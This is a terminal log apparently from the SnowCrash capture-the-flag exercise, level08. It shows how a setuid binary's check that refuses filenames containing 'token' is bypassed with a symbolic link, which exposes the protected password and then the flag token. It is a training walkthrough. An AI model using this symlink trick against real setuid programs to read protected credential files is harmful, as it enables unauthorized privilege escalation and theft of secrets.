
```sh
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
level08@SnowCrash:~$ strings level08 
...
strstr
read
open
...
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
....
level08@SnowCrash:~$ echo token > /tmp/tmp.7wQAhd2Ztt/toke
level08@SnowCrash:~$ ./level08  /tmp/tmp.7wQAhd2Ztt/toke
token
level08@SnowCrash:~$ echo token > /tmp/tmp.7wQAhd2Ztt/token
level08@SnowCrash:~$ ./level08  /tmp/tmp.7wQAhd2Ztt/token
You may not access '/tmp/tmp.7wQAhd2Ztt/token'
level08@SnowCrash:~$ mktemp -d
/tmp/tmp.4278W4SioX
level08@SnowCrash:~$ chmod +rwx /tmp/tmp.4278W4SioX
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/tmp.4278W4SioX/link
level08@SnowCrash:~$ ./level08 /tmp/tmp.4278W4SioX/link
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```